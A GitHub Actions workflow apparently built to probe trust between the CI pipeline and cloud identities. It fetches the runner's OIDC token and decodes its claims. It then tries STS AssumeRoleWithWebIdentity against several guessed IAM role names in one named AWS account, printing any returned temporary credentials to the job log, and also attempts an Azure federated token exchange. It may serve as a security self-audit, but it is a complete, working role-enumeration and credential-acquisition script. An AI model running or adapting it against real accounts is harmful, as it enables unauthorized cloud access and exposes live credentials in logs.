name: oidc-probe
on: workflow_dispatch
permissions:
  contents: read
  id-token: write
jobs:
  probe:
    runs-on: ubuntu-latest
    environment: release
    permissions:
      contents: read
      id-token: write
    steps:
      - name: context
        run: |
          id; uname -a
          echo "REPO=$GITHUB_REPOSITORY REF=$GITHUB_REF SHA=$GITHUB_SHA RUN=$GITHUB_RUN_ID"
      - name: oidc-sts
        run: |
          set +e
          echo "OIDC_URL_PRESENT=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
          TOK=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
          echo "TOKEN_LEN=${#TOK}"
          echo "$TOK" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool || true
          for ROLE in github/hex-release github/hex-dev github/hex-production hex-release hex; do
            echo "--- assume $ROLE"
            curl -s -X POST https://sts.amazonaws.com/ --data-urlencode "Action=AssumeRoleWithWebIdentity" --data-urlencode "Version=2011-06-15" --data-urlencode "RoleArn=arn:aws:iam::604439173067:role/$ROLE" --data-urlencode "RoleSessionName=oidcprobe" --data-urlencode "WebIdentityToken=$TOK" --data-urlencode "DurationSeconds=900"
            echo
          done
      - name: negative-control
        run: |
          set +e
          echo "--- wrong-audience token against hex-release"
          TOK2=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://bogus.invalid.example" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
          curl -s -X POST https://sts.amazonaws.com/ --data-urlencode "Action=AssumeRoleWithWebIdentity" --data-urlencode "Version=2011-06-15" --data-urlencode "RoleArn=arn:aws:iam::604439173067:role/github/hex-release" --data-urlencode "RoleSessionName=negctl" --data-urlencode "WebIdentityToken=$TOK2" --data-urlencode "DurationSeconds=900"
          echo
      - name: azure-fed
        run: |
          set +e
          echo "--- azure federated exchange attempt (audience api://AzureADTokenExchange)"
          TOK3=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])' 2>/dev/null)
          echo "AZ_TOKEN_LEN=${#TOK3}"
          echo "$TOK3" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool || true
